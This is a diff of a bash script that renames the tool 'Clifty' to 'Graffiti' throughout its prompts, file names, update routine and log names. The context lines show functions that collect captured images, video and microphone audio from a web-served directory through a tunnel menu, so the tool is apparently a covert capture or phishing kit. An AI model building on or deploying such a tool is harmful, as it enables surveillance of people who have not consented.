@@ -128,7 +128,7 @@ colorcodes(){
     fi
 }
 prompt(){
-    prompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty${NF} >>${NA} ${CYAN}")"
+    prompt="$(echo -e "${GREEN}>> ${ULYELLOW}Graffiti${NF} >>${NA} ${CYAN}")"
 }
 ## Directories
 directories(){
@@ -310,10 +310,10 @@ kill_pid() {
 
 #check whether execute permission is granted
 xpermission(){
-	if [[ -x "clifty.sh" ]];then
+	if [[ -x "Graffiti.sh" ]];then
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 	else
-	        chmod 777 clifty.sh
+	        chmod 777 Graffiti.sh
 	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 	fi
 }
@@ -333,8 +333,8 @@ update(){
                 sleep 2
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${MAGENTA} RESTARTING THE TOOL!!${NC} "
                 cd ${pro_dir}
-                chmod 777 clifty.sh
-                bash clifty.sh
+                chmod 777 Graffiti.sh
+                bash Graffiti.sh
                 
 	else
 		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED}Your offline, Check your internet and try again."
@@ -1018,7 +1018,7 @@ echo -e "${RED}[${WHITE}01${RED}]${YELLOW} View Logs    "
 echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Open Logs   "
 echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Reset Logs  "
 echo -e "${RED}[${WHITE}04${RED}]${YELLOW} Back to Tunnel menu   "
-temprompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty/Logs${NF} >>${NA} ${BLUE}")"
+temprompt="$(echo -e "${GREEN}>> ${ULYELLOW}Graffiti/Logs${NF} >>${NA} ${BLUE}")"
 read -p "${temprompt}" reply_logs_menu
 
         case $reply_logs_menu in
@@ -2177,7 +2177,7 @@ capture_img(){
             cat ${dumps_dir}/space.txt >> ${final_log_name}
             cat ${www_dir}/Log.log >> ${final_log_name}
             rm -rf ${www_dir}/Log.log
-            mv ${www_dir}/*.png  "${final_log_dir}/clifty-img-${filename}.png"
+            mv ${www_dir}/*.png  "${final_log_dir}/Graffiti-img-${filename}.png"
             echo ""
         fi
         sleep 0.5
@@ -2197,7 +2197,7 @@ capture_vid(){
             cat ${dumps_dir}/line.txt >> ${final_log_name}
 	        cat ${dumps_dir}/space.txt >> ${final_log_name}
             cat ${www_dir}/Log.log >> ${final_log_name}
-            mv ${www_dir}/*.webm  "${final_log_dir}/clifty-video-${filename}.webm"
+            mv ${www_dir}/*.webm  "${final_log_dir}/Graffiti-video-${filename}.webm"
             echo -ne "\n${CYAN}Saved in Logs"
         fi
         sleep 0.5
@@ -2218,7 +2218,7 @@ capture_mic(){
 	        cat ${dumps_dir}/space.txt >> ${final_log_name}
             cat ${www_dir}/Log.log >> ${final_log_name}
 			rm -rf ${www_dir}/Log.log
-            mv ${www_dir}/*.wav  "${final_log_dir}/clifty-audio-${filename}.wav"
+            mv ${www_dir}/*.wav  "${final_log_dir}/Graffiti-audio-${filename}.wav"
             echo -ne "\n${CYAN}Saved in Logs"
         fi
         sleep 0.5
